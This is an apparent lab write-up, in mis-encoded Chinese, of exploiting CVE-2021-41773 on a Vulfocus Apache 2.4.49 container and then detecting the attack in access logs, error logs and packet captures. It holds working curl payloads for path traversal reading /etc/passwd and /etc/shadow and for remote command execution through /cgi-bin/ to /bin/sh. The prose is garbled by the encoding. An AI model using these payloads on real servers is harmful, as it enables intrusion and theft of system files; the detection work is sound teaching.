![1748153067964](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153067964.png)

#### 2. ä¿¡æ¯æ”¶é›†

##### 2.1 åŸºç¡€ç«¯å£æ‰«æ

```bash
# æ‰«æ Apache æœåŠ¡ç«¯å£
nmap -sV -p 80,443,8080-8090 10.37.133.3
```

**æ‰«æç»“æœ**:

![1748153021142](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153021142.png)

**æ‰«æç»“æœåˆ†æ**ï¼š

- å¸¸è§„HTTPç«¯å£(80, 443, 8080-8090)å‡æ˜¾ç¤ºä¸ºå…³é—­æˆ–è¿‡æ»¤çŠ¶æ€
- ApacheæœåŠ¡è¿è¡Œåœ¨éæ ‡å‡†ç«¯å£ä¸Šï¼Œé€šè¿‡Vulfocuså¹³å°åŠ¨æ€åˆ†é…ä¸º**13503ç«¯å£**
- éœ€è¦ç›´æ¥è®¿é—®æŒ‡å®šçš„æ˜ å°„ç«¯å£è¿›è¡Œåç»­ä¿¡æ¯æ”¶é›†

##### 2.2 Web æœåŠ¡è¯†åˆ«

é€šè¿‡æµè§ˆå™¨è®¿é—® Apache æœåŠ¡ `http://10.37.133.3:42286`ã€‚

![1748152989670](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748152989670.png)

##### 2.3 Apache ç‰ˆæœ¬æ£€æµ‹

```bash
# ä½¿ç”¨ curl è·å–æœåŠ¡å™¨ä¿¡æ¯
curl -I http://10.37.133.3:42286

# ä½¿ç”¨ nikto è¿›è¡Œ Web æ‰«æ
nikto -h http://10.37.133.3:42286
```

![1748153862204](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153862204.png)

**å…³é”®å‘ç°**ï¼š

- **æœåŠ¡å™¨ç‰ˆæœ¬**: `Apache/2.4.49 (Debian)` - **è¿™æ­£æ˜¯CVE-2021-41773æ¼æ´å½±å“çš„ç¡®åˆ‡ç‰ˆæœ¬**
- **æ“ä½œç³»ç»Ÿ**: Debian Linux
- **æ–‡ä»¶ä¿®æ”¹æ—¶é—´**: 2021-10-09ï¼Œä¸CVEæŠ«éœ²æ—¶é—´å»åˆ
- **å“åº”æ­£å¸¸**: HTTP 200çŠ¶æ€ç ï¼ŒæœåŠ¡å™¨æ­£å¸¸è¿è¡Œ

##### 2.4 Nikto å®‰å…¨æ‰«æ

**niktoæ‰«æç»“æœ**:

![1748153891702](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153891702.png)

**Niktoæ‰«æåˆ†æ**ï¼š

- **ç‰ˆæœ¬ç¡®è®¤**: å†æ¬¡ç¡®è®¤Apache/2.4.49ç‰ˆæœ¬ï¼Œ**æ˜ç¡®æ ‡æ³¨ä¸ºè¿‡æ—¶ç‰ˆæœ¬**
- **å®‰å…¨é…ç½®ç¼ºé™·**:
  - ç¼ºå°‘ `X-Frame-Options`å¤´(ç‚¹å‡»åŠ«æŒé˜²æŠ¤)
  - ç¼ºå°‘ `X-Content-Type-Options`å¤´(MIMEç±»å‹å—…æ¢é˜²æŠ¤)
- **ä¿¡æ¯æ³„éœ²**: ETagå¤´å¯èƒ½æ³„éœ²æœåŠ¡å™¨inodeä¿¡æ¯
- **HTTPæ–¹æ³•**: æ”¯æŒPOST, OPTIONS, HEAD, GETæ–¹æ³•
- **é‡è¦**: æ‰«æè¿‡ç¨‹ä¸­æœªè§¦å‘æ˜æ˜¾çš„å®‰å…¨æ‹¦æˆªï¼Œè¯´æ˜æœåŠ¡å™¨é…ç½®ç›¸å¯¹å®½æ¾

##### 2.5 ç›®å½•ç»“æ„æ¢æµ‹

```bash
# ä½¿ç”¨ dirb è¿›è¡Œç›®å½•æ‰«æ
dirb http://10.37.133.3:42286
```

**dirbæ‰«æç»“æœ**:

![1748153913104](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153913104.png)

**ç›®å½•å‘ç°åˆ†æ**ï¼š

- **`/cgi-bin/` (403 Forbidden)**: **å…³é”®å‘ç°** - è¿™æ˜¯CVE-2021-41773æ¼æ´åˆ©ç”¨çš„æ ¸å¿ƒè·¯å¾„
  - 403çŠ¶æ€è¡¨æ˜ç›®å½•å­˜åœ¨ä½†è®¿é—®è¢«é™åˆ¶
  - CGIç›®å½•çš„å­˜åœ¨ä¸ºè·¯å¾„éå†æ”»å‡»æä¾›äº†å…¥å£ç‚¹
- **`/index.html` (200 OK)**: æ ‡å‡†é¦–é¡µæ–‡ä»¶ï¼Œå¤§å°10701å­—èŠ‚
- **`/server-status` (403 Forbidden)**: ApacheçŠ¶æ€é¡µé¢ï¼Œè¢«ä¿æŠ¤ä½†å­˜åœ¨

##### 2.6 ä¿¡æ¯æ”¶é›†æ€»ç»“

1. **æ¼æ´ç¡®è®¤**:

   - Apacheç‰ˆæœ¬2.4.49**å®Œå…¨åŒ¹é…CVE-2021-41773çš„å—å½±å“ç‰ˆæœ¬**
   - æœåŠ¡å™¨é…ç½®æ ‡å‡†ï¼Œæœªå‘ç°ç‰¹æ®Šçš„å®‰å…¨åŠ å›º
2. **æ”»å‡»æ¡ä»¶æ»¡è¶³**:

   - **ç‰ˆæœ¬åŒ¹é…**: ç¡®è®¤ä¸ºæ˜“å—æ”»å‡»çš„Apacheç‰ˆæœ¬
   - **æœåŠ¡é…ç½®**: æ ‡å‡†Apacheé…ç½®ï¼Œä¸ºè·¯å¾„éå†æ”»å‡»æä¾›äº†æ¡ä»¶
3. **å®‰å…¨æ€åŠ¿è¯„ä¼°**:

   - **é«˜é£é™©**: ç‰ˆæœ¬å®Œå…¨åŒ¹é…å·²çŸ¥é«˜å±æ¼æ´
   - **é…ç½®è–„å¼±**: ç¼ºå°‘å¤šä¸ªå®‰å…¨å¤´ï¼Œä¿¡æ¯æ³„éœ²é£é™©
   - **æ”»å‡»é¢**: CGIåŠŸèƒ½å¯ç”¨ï¼Œä¸ºä»£ç æ‰§è¡Œæä¾›äº†å¯èƒ½

#### 3. æ¼æ´åˆ†æä¸åˆ©ç”¨

##### 3.1 CVE-2021-41773 æ¼æ´åŸç†

**æ¼æ´åŸºæœ¬ä¿¡æ¯**:

- **CVEç¼–å·**: CVE-2021-41773
- **CVSSè¯„åˆ†**: 7.5 (é«˜å±)
- **æ¼æ´ç±»å‹**: è·¯å¾„éå† (Path Traversal)
- **å½±å“ç‰ˆæœ¬**: Apache HTTP Server 2.4.49
- **æ¼æ´åŸç†**: Apache 2.4.49ç‰ˆæœ¬åœ¨å¤„ç†URLè·¯å¾„è§„èŒƒåŒ–æ—¶å­˜åœ¨ç¼ºé™·ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹æ®Šçš„URLç¼–ç ç»•è¿‡è·¯å¾„é™åˆ¶ï¼Œè®¿é—®Webæ ¹ç›®å½•ä¹‹å¤–çš„æ–‡ä»¶

**æŠ€æœ¯ç»†èŠ‚**:

- **æ ¹æœ¬åŸå› **: Apacheå¯¹URLä¸­çš„è·¯å¾„åˆ†éš”ç¬¦å’Œç‚¹å·åºåˆ—çš„å¤„ç†ä¸å½“
- **ç»•è¿‡æœºåˆ¶**: ä½¿ç”¨URLç¼–ç çš„ç‚¹å·(`%2e`)å¯ä»¥ç»•è¿‡è·¯å¾„è§„èŒƒåŒ–æ£€æŸ¥
- **æ”»å‡»è·¯å¾„**: é€šè¿‡Aliasæ˜ å°„çš„ç›®å½•(å¦‚ `/cgi-bin/`, `/icons/`)è¿›è¡Œè·¯å¾„éå†

##### 3.2 è·¯å¾„éå†æ”»å‡»å®è·µ

###### 3.2.1 åŸºç¡€è·¯å¾„éå†æµ‹è¯•

```bash
# å°è¯•é€šè¿‡CGIè·¯å¾„è¯»å– /etc/passwd æ–‡ä»¶
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# å°è¯•è¯»å– Apache é…ç½®æ–‡ä»¶
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/apache2/apache2.conf"

# å°è¯•è¯»å–å…¶ä»–æ•æ„Ÿæ–‡ä»¶
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow"
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/proc/version"
```

**æ‰§è¡Œç»“æœåˆ†æ**:
æ‰€æœ‰é€šè¿‡ `/cgi-bin/`è·¯å¾„çš„æ”»å‡»å°è¯•éƒ½è¿”å›äº† `500 Internal Server Error`ï¼Œè¿™è¡¨æ˜ï¼š

1. **CGIé…ç½®é—®é¢˜**: CGIæ¨¡å—å¯èƒ½æ²¡æœ‰æ­£ç¡®é…ç½®æˆ–ç¼ºå°‘å¿…è¦çš„CGIè„šæœ¬
2. **è·¯å¾„è§£æé—®é¢˜**: Apacheå¯èƒ½å¯¹CGIè·¯å¾„ä¸‹çš„è·¯å¾„éå†æœ‰ç‰¹æ®Šå¤„ç†
3. **æƒé™é™åˆ¶**: å¯èƒ½å­˜åœ¨é¢å¤–çš„è®¿é—®æ§åˆ¶æœºåˆ¶

###### 3.2.2 éCGIè·¯å¾„çš„ç›´æ¥éå†æ”»å‡»

CVE-2021-41773ä¸ä»…é™äºCGIè·¯å¾„ï¼Œæˆ‘ä»¬å°è¯•å…¶ä»–æ˜ å°„è·¯å¾„ï¼š

```bash
# å°è¯•é€šè¿‡iconsè·¯å¾„è¿›è¡Œéå†
curl "http://10.37.133.3:42286/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# å°è¯•é€šè¿‡manualè·¯å¾„è¿›è¡Œéå†  
curl "http://10.37.133.3:42286/manual/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# ç›´æ¥æ ¹è·¯å¾„å°è¯•
curl "http://10.37.133.3:42286/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

**æ‰§è¡Œç»“æœ**:

![1748164510299](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748164510299.png)

![1748164589138](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748164589138.png)

**æ”»å‡»ç»“æœåˆ†æ**:

1. âœ… **`/icons/` è·¯å¾„æ”»å‡»æˆåŠŸ**

   - **çŠ¶æ€**: ğŸ‰ å®Œå…¨æˆåŠŸ - è¯»å–åˆ°å®Œæ•´çš„ `/etc/passwd` æ–‡ä»¶
   - **ç¼–ç æ–¹å¼**: ä»…ä½¿ç”¨åŸºç¡€çš„å•å±‚URLç¼–ç  `%2e%2e`ï¼ˆä¸éœ€è¦åŒé‡ç¼–ç ï¼‰
   - **æŠ€æœ¯æ„ä¹‰**: è¯æ˜CVE-2021-41773ä¸ä»…é™äºCGIè·¯å¾„ï¼Œè¿˜å½±å“Apacheçš„é™æ€èµ„æºæ˜ å°„
2. ğŸš« **`/manual/` è·¯å¾„è¢«é˜»æ­¢**

   - **çŠ¶æ€**: 403 Forbidden
   - **åŸå› **: Manualæ–‡æ¡£è·¯å¾„å¯èƒ½æœ‰ç‰¹æ®Šçš„è®¿é—®æ§åˆ¶é…ç½®
   - **å®‰å…¨ç­–ç•¥**: è¡¨æ˜æŸäº›è·¯å¾„æ˜ å°„æœ‰é¢å¤–çš„å®‰å…¨é™åˆ¶
3. ğŸš« **ç›´æ¥æ ¹è·¯å¾„è¢«é˜»æ­¢**

   - **çŠ¶æ€**: 403 Forbidden
   - **åŸå› **: æ ¹è·¯å¾„çš„è·¯å¾„éå†è¢«Apacheçš„åŸºç¡€å®‰å…¨æœºåˆ¶é˜»æ­¢

##### 3.3 è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)æ”»å‡»

###### 3.3.1 CGIè·¯å¾„çš„RCEæ”»å‡»å°è¯•

```bash
# é€šè¿‡CGIè·¯å¾„æ‰§è¡Œshellå‘½ä»¤
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; id"
```

**RCEæ”»å‡»ç»“æœ**:

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![1748164624555](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748164624555.png)
**ğŸ‰ RCEæ”»å‡»æˆåŠŸï¼**

- **æƒé™è·å–**: æˆåŠŸä»¥ `www-data`ç”¨æˆ·èº«ä»½æ‰§è¡Œå‘½ä»¤
- **æ”»å‡»æ–¹å¼**: é€šè¿‡CGIè·¯å¾„ç»“åˆè·¯å¾„éå†ï¼Œç›´æ¥è°ƒç”¨ç³»ç»Ÿshell
- **ç¼–ç æŠ€æœ¯**: ä½¿ç”¨æ··åˆç¼–ç  `.%2e`ç»•è¿‡è·¯å¾„é™åˆ¶

###### 3.3.2 ç³»ç»Ÿä¿¡æ¯æ”¶é›†

```bash
# è·å–ç³»ç»Ÿä¿¡æ¯
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; uname -a"

# æŸ¥çœ‹å½“å‰ç›®å½•
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; pwd"

# åˆ—å‡ºæ ¹ç›®å½•å†…å®¹
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; ls -la /"
```

![1748164663202](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748164663202.png)

##### 3.4 Flagæ–‡ä»¶æœç´¢ä¸è·å–

###### 3.4.1 ç³»ç»Ÿæ–‡ä»¶æœç´¢

```bash
# æœç´¢ç³»ç»Ÿä¸­æ‰€æœ‰åŒ…å«flagçš„æ–‡ä»¶
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; find / -name '*flag*' 2>/dev/null"
```

![1748164677317](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748164677317.png)

æ‰¾åˆ°äº†ï¼flagæ–‡ä»¶åœ¨ `/tmp/flag-{bmha8de6a45-2ae2-4615-97ff-1af1edd5afcf}`**

#### 4. å¨èƒæ£€æµ‹

##### 4.1 Apache è®¿é—®æ—¥å¿—åˆ†æ

###### 4.1.1 å®šä½å®¹å™¨å’Œæ—¥å¿—è·¯å¾„

```bash
# æŸ¥çœ‹è¿è¡Œä¸­çš„ Apache å®¹å™¨
docker ps | grep apache
```

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~]
â””â”€$ docker ps | grep apache

a2b4c3a1d377   vulfocus/apache-cve_2021_41773:latest      "/entry.sh"              22 minutes ago   Up 20 seconds           0.0.0.0:42286->80/tcp, :::42286->80/tcp                                                flamboyant_maxwell
```

```bash

# è¿›å…¥å®¹å™¨æŸ¥çœ‹æ—¥å¿—
docker exec -it a2b4c3a1d377 /bin/bash

# Apache è®¿é—®æ—¥å¿—é€šå¸¸ä½äºä»¥ä¸‹è·¯å¾„
ls -la /var/log/apache2/
# é‡ç‚¹å…³æ³¨ access.log å’Œ error.log
```

![1748160129290](image/apacheé¶æ ‡/1748160129290.png)

###### 4.1.2 è®¿é—®æ—¥å¿—åˆ†æ

```bash
# æŸ¥çœ‹æœ€è¿‘çš„è®¿é—®æ—¥å¿—
tail -f /var/log/apache2/access.log

# æœç´¢è·¯å¾„éå†æ”»å‡»ç‰¹å¾
grep -i "%2e%2e\|\.\./" /var/log/apache2/access.log

# æœç´¢CGIç›¸å…³çš„å¯ç–‘è¯·æ±‚
grep -i "cgi-bin" /var/log/apache2/access.log

# æœç´¢iconsè·¯å¾„çš„å¼‚å¸¸è®¿é—®
grep -i "icons.*%2e" /var/log/apache2/access.log
```

![1748161429843](image/apacheé¶æ ‡/1748161429843.png)

![1748161438797](image/apacheé¶æ ‡/1748161438797.png)1. è·¯å¾„éå†æ”»å‡»è®°å½•

**é€šè¿‡ `/icons/`è·¯å¾„çš„æ”»å‡»**ï¼š

```bash
10.37.133.2 - - [25/May/2025:07:39:25 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 200 1126 "-" "curl/8.7.1"
```

* **æ”»å‡»ç‰¹å¾**: ä½¿ç”¨ `%2e%2e`ï¼ˆURLç¼–ç çš„ `..`ï¼‰è¿›è¡Œè·¯å¾„éå†
* **ç›®æ ‡æ–‡ä»¶**: `/etc/passwd`ç³»ç»Ÿç”¨æˆ·æ–‡ä»¶
* **çŠ¶æ€ç **: `200` - **æ”»å‡»æˆåŠŸ**ï¼Œè¿”å›äº†1126å­—èŠ‚çš„æ–‡ä»¶å†…å®¹
* **æ”»å‡»å·¥å…·**: `curl/8.7.1`

2. Flagæ–‡ä»¶æœç´¢å°è¯•

æ”»å‡»è€…ç³»ç»Ÿæ€§åœ°æœç´¢flagæ–‡ä»¶çš„å¸¸è§ä½ç½®ï¼š

```bash
10.37.133.2 - - [25/May/2025:07:39:30 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:39:34 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/tmp/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:39:39 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/var/www/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:39:48 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:39:56 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/var/www/html/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:40:00 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/flag.txt HTTP/1.1" 404 437 "-" "curl/8.7.1"
```

**æ”»å‡»æ¨¡å¼åˆ†æ**ï¼š

- **ç³»ç»Ÿæ€§æœç´¢**: æ”»å‡»è€…æŒ‰é¡ºåºå°è¯•äº†å¤šä¸ªå¯èƒ½çš„flagä½ç½®
- **çŠ¶æ€ç **: å…¨éƒ¨è¿”å› `404 Not Found`ï¼Œè¯´æ˜è¿™äº›ä½ç½®æ²¡æœ‰flagæ–‡ä»¶
- **æ—¶é—´é—´éš”**: æ¯æ¬¡å°è¯•é—´éš”4-8ç§’ï¼Œæ˜¾ç¤ºä¸ºæ‰‹åŠ¨æˆ–è„šæœ¬åŒ–æ”»å‡»

3. è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)æ”»å‡»

**é€šè¿‡CGIè·¯å¾„æ‰§è¡Œå‘½ä»¤**ï¼š

```bash
10.37.133.2 - - [25/May/2025:07:40:16 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 188 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:40:21 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 887 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:40:26 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 133 "-" "curl/8.7.1"
```

**RCEæ”»å‡»ç‰¹å¾**ï¼š

- **æ”»å‡»è·¯å¾„**: `/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh`
- **ç¼–ç æŠ€æœ¯**: æ··åˆä½¿ç”¨ `.%2e`ç»•è¿‡è·¯å¾„é™åˆ¶
- **HTTPæ–¹æ³•**: `POST` - ç”¨äºå‘é€å‘½ä»¤æ‰§è¡Œçš„payload
- **çŠ¶æ€ç **: `200` - **RCEæ”»å‡»æˆåŠŸ**
- **å“åº”å¤§å°å˜åŒ–**: ä»133å­—èŠ‚åˆ°887å­—èŠ‚ï¼Œè¯´æ˜æ‰§è¡Œäº†ä¸åŒçš„å‘½ä»¤

4.1.3 é”™è¯¯æ—¥å¿—åˆ†æ

```bash
# æŸ¥çœ‹Apacheé”™è¯¯æ—¥å¿—
tail -f /var/log/apache2/error.log

# æœç´¢ä¸è·¯å¾„éå†ç›¸å…³çš„é”™è¯¯
grep -i "path\|directory\|forbidden" /var/log/apache2/error.log

# æœç´¢CGIæ‰§è¡Œç›¸å…³çš„é”™è¯¯
grep -i "cgi\|script" /var/log/apache2/error.log
```

![1748161515881](image/apacheé¶æ ‡/1748161515881.png)

Apacheé”™è¯¯æ—¥å¿—åˆ†æ:

1. è·¯å¾„éå†æ£€æµ‹ä¸é˜»æ­¢

**æ— æ•ˆURIè·¯å¾„é”™è¯¯**ï¼š

```bash
[Sun May 25 07:39:43.793225 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.html)
[Sun May 25 07:39:43.795361 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.cgi)
[Sun May 25 07:39:43.795451 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.pl)
[Sun May 25 07:39:43.795499 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.php)
[Sun May 25 07:39:43.795517 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.xhtml)
[Sun May 25 07:39:43.795536 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.htm)
```

**å…³é”®å‘ç°**ï¼š

- **é”™è¯¯ä»£ç **: `AH10244` - Apacheæ£€æµ‹åˆ°æ— æ•ˆçš„URIè·¯å¾„
- **æ”»å‡»æ¨¡å¼**: ä½¿ç”¨æœªç¼–ç çš„ `../../../../`è¿›è¡Œè·¯å¾„éå†
- **æ—¶é—´é›†ä¸­**: åœ¨07:39:43çš„å‡ æ¯«ç§’å†…è¿ç»­è§¦å‘6æ¬¡é”™è¯¯
- **ç›®æ ‡æ–‡ä»¶**: æ”»å‡»è€…å°è¯•è®¿é—®å„ç§indexæ–‡ä»¶ï¼ˆ.html, .cgi, .pl, .php, .xhtml, .htmï¼‰
- **é˜²æŠ¤æœºåˆ¶**: Apacheçš„è·¯å¾„è§„èŒƒåŒ–æ£€æŸ¥æˆåŠŸé˜»æ­¢äº†è¿™äº›æ”»å‡»

2. CGIæ‰§è¡Œé”™è¯¯åˆ†æ

**CGIæ”»å‡»åˆ†æ**ï¼š

- **é”™è¯¯ç±»å‹**: `cgid:error` - CGIå®ˆæŠ¤è¿›ç¨‹é”™è¯¯
- **æƒé™é—®é¢˜**: ç³»ç»Ÿæ‹’ç»æ‰§è¡Œ `/etc/passwd`æ–‡ä»¶ï¼ˆå› ä¸ºå®ƒä¸æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼‰
- **æ”»å‡»æ„å›¾**: æ”»å‡»è€…è¯•å›¾é€šè¿‡CGIè·¯å¾„ç›´æ¥æ‰§è¡Œç³»ç»Ÿæ–‡ä»¶
- **é˜²æŠ¤æ•ˆæœ**: æ–‡ä»¶ç³»ç»Ÿæƒé™æˆåŠŸé˜»æ­¢äº†æ¶æ„æ‰§è¡Œ

**Shellæ‰§è¡Œé”™è¯¯**ï¼š

```bash
[Sun May 25 07:41:05.002629 2025] [cgid:error] [pid 20:tid 281472728565312] [client 10.37.133.3:58948] End of script output before headers: sh
```

**é‡è¦å‘ç°**ï¼š

- **æ”»å‡»æºå˜åŒ–**: ä» `10.37.133.2`åˆ‡æ¢åˆ° `10.37.133.3`
- **æ‰§è¡Œç›®æ ‡**: ç›´æ¥è°ƒç”¨ `sh` shell
- **é”™è¯¯æ€§è´¨**: "End of script output before headers" - è¡¨æ˜shellè¢«æ‰§è¡Œä½†æ²¡æœ‰äº§ç”Ÿæœ‰æ•ˆçš„CGIè¾“å‡ºå¤´
- **æ”»å‡»æˆåŠŸ**: å°½ç®¡æœ‰é”™è¯¯ï¼Œä½†è¿™å®é™…ä¸Šè¡¨æ˜RCEæ”»å‡»å¯èƒ½å·²ç»æˆåŠŸ

5. å®‰å…¨é˜²æŠ¤æ•ˆæœè¯„ä¼°

**æˆåŠŸçš„é˜²æŠ¤**ï¼š

- âœ… **è·¯å¾„è§„èŒƒåŒ–æ£€æŸ¥**: é˜»æ­¢äº†æœªç¼–ç çš„è·¯å¾„éå†
- âœ… **æ–‡ä»¶æƒé™æ§åˆ¶**: é˜»æ­¢äº†éå¯æ‰§è¡Œæ–‡ä»¶çš„æ‰§è¡Œ
- âœ… **CGIå®‰å…¨æœºåˆ¶**: é™åˆ¶äº†æ¶æ„CGIæ‰§è¡Œ

**é˜²æŠ¤ç»•è¿‡**ï¼š

- âŒ **ç¼–ç ç»•è¿‡**: URLç¼–ç çš„è·¯å¾„éå†æœªè¢«é˜»æ­¢ï¼ˆä»è®¿é—®æ—¥å¿—å¯è§ï¼‰
- âŒ **Shellæ‰§è¡Œ**: æœ€ç»ˆæˆåŠŸæ‰§è¡Œäº†shellå‘½ä»¤

##### 4.2 ç½‘ç»œæµé‡æ•è·ä¸åˆ†æ

###### 4.2.1 ç¡®å®šå®¹å™¨ç½‘ç»œä¿¡æ¯

```bash
# è·å– Apache å®¹å™¨çš„è¯¦ç»†ä¿¡æ¯
docker inspect a2b4c3a1d377 | grep -A 10 -B 5 "IPAddress"
```

![1748160719557](image/apacheé¶æ ‡/1748160719557.png)
æ ¹æ®å®¹å™¨ä¿¡æ¯ï¼Œå†…éƒ¨ IP ä¸º `172.17.0.2`

###### 4.2.2 HTTPæµé‡ç›‘æ§

```bash
# ç›‘å¬ Docker ç½‘æ¡¥ä¸Šçš„ HTTP æµé‡
sudo tcpdump -i docker0 -A -w apache_cve_traffic.pcap 'host 172.17.0.2'
```

åœ¨å¦ä¸€ä¸ªç»ˆç«¯æ‰§è¡Œæ”»å‡»å‘½ä»¤ï¼Œç„¶ååœæ­¢æŠ“åŒ…ï¼š

```bash
# æ‰§è¡Œè·¯å¾„éå†æ”»å‡»
curl "http://10.37.133.3:42286/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# æ‰§è¡ŒRCEæ”»å‡»
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; id"
```

![1748160898808](image/apacheé¶æ ‡/1748160898808.png)

![1748160908687](image/apacheé¶æ ‡/1748160908687.png)

###### 4.2.3 æµé‡åˆ†æè¦ç‚¹

ä½¿ç”¨ Wireshark åˆ†ææ•è·çš„æµé‡ï¼š

1. **è·¯å¾„éå†è¯†åˆ«**: æŸ¥æ‰¾åŒ…å« `%2e%2e`ç¼–ç çš„HTTP GETè¯·æ±‚
2. **RCEæ”»å‡»è¯†åˆ«**: å¯»æ‰¾å‘CGIè·¯å¾„å‘é€POSTæ•°æ®çš„è¯·æ±‚
3. **å“åº”åˆ†æ**: è§‚å¯ŸæœåŠ¡å™¨è¿”å›çš„æ•æ„Ÿæ–‡ä»¶å†…å®¹æˆ–å‘½ä»¤æ‰§è¡Œç»“æœ
4. **å¼‚å¸¸æ¨¡å¼**: è¯†åˆ«çŸ­æ—¶é—´å†…å¤§é‡è·¯å¾„éå†å°è¯•çš„æ¨¡å¼

![1748160976060](image/apacheé¶æ ‡/1748160976060.png)

wiresharkæµé‡åˆ†æ

1. æ”»å‡»æµé‡æ¦‚è§ˆ

**æ•è·çš„æ•°æ®åŒ…æ€»æ•°**: 20ä¸ªæ•°æ®åŒ…
**æ”»å‡»æŒç»­æ—¶é—´**: çº¦4.2ç§’
**æ”»å‡»æº**: `10.37.133.3` (Kaliæ”»å‡»æœº)
**ç›®æ ‡**: `172.17.0.2:80` (Apacheå®¹å™¨)

2. ç¬¬ä¸€æ¬¡æ”»å‡»è¿æ¥åˆ†æ (æ•°æ®åŒ…1-10)

2.1 TCPè¿æ¥å»ºç«‹

```
æ•°æ®åŒ…1-3: TCPä¸‰æ¬¡æ¡æ‰‹
- æ•°æ®åŒ…1 (0.000000s): SYN - æ”»å‡»æœºå‘èµ·è¿æ¥è¯·æ±‚
- æ•°æ®åŒ…2 (0.000030s): SYN+ACK - æœåŠ¡å™¨å“åº”è¿æ¥
- æ•°æ®åŒ…3 (0.000040s): ACK - è¿æ¥å»ºç«‹å®Œæˆ
```

**è¿æ¥ç‰¹å¾**:

- **ç«¯å£æ˜ å°„**: æ”»å‡»æœºç«¯å£40722 â†’ æœåŠ¡å™¨ç«¯å£80
